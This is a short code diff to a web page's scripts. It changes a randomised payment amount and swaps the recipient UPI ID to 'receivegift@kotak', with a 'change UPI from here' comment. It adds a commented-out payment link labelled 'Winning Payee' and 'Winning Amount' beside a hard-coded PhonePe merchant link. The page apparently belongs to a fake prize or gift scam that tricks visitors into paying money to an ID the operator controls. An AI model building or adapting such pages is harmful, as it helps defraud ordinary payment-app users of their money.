@@ -31,7 +31,7 @@ function randomNumber(min, max) {
   return Math.random() * (max - min) + min;
 }
 
-var price = Math.floor(randomNumber(1901,1951));
+var price = Math.floor(randomNumber(900,999));
 console.log(price);
 
   </script>
@@ -91,11 +91,12 @@ console.log(price);
     
 <script>
   var upi = document.getElementById('upi');
-  var id = 'arihant@upi' // change UPI from here
+  var id = 'receivegift@kotak' // change UPI from here
 
   var link = "upi://pay?mode=02&pa=Q775086968@ybl&purpose=00&mc=0000&pn=PhonePeMerchant&orgid=180001&sign=MEUCIDcyaTUpprd4YWsJupIrFXEluuscbeYh4i4haDuWBo+MAiEAgXn5MMbxUROmx+I/A0wj+NWOfHc2aF9UFwBvn6SPjXY="
   // "upi://pay?pa="+id+"&pn=Winning Payee&tn=Winning Amount&am="+price+"&mode=01"
   upi.setAttribute("href",link );
+  // upi.setAttribute("href", "gpay://upi/pay?pa="+id+"&pn=Winning Payee&tn=Winning Amount&am="+price+"&mode=01");
 </script>
            
 
